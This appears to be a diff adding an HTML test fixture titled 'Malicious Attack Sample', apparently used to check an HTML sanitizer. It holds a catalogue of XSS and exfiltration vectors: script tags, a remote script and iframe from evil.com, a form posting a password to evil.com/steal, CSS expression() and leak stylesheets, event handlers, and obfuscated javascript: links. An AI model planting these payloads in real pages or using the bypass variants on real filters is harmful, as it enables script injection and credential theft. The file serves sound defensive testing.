@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Malicious Attack Sample</title>
+  <meta http-equiv="refresh" content="0;url=http://evil.com">
+  <base href="https://attacker.com/">
+  <link rel="stylesheet" href="http://evil.com/leak.css">
+  <script>alert('pwned')</script>
+  <style>
+    @import url("http://evil.com/leak.css");
+    body {
+      background: url("http://evil.com/tracker.png");
+      color: expression(alert('ie_xss'));
+    }
+  </style>
+</head>
+<body onload="alert('onload')">
+  <h1>Legit Looking Header</h1>
+  <script src="http://evil.com/bad.js"></script>
+  <iframe src="http://evil.com/stealer"></iframe>
+  <object data="evil.swf"></object>
+  <embed src="evil.swf">
+  <form action="http://evil.com/steal" method="POST">
+    <input type="password" name="secret" value="1234">
+    <button type="submit">Submit</button>
+  </form>
+  <img src="x" onerror="alert('onerror')">
+  <img src="http://example.com/remote.png">
+  <img src="//example.com/protocol_relative.png">
+  <a href="javascript:alert('xss_link')">Click for Free Money</a>
+  <a href=" JaVaScRiPt:alert('case_whitespace')">Click Me</a>
+  <a href="java&#10;script:alert('newline')">Click newline</a>
+  <div style="background: url('http://evil.com/bg.png'); color: expression(alert('style_xss'));">
+    Injected DIV
+  </div>
+  <svg onload="alert('svg_onload')">
+    <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
+  </svg>
+</body>
+</html>
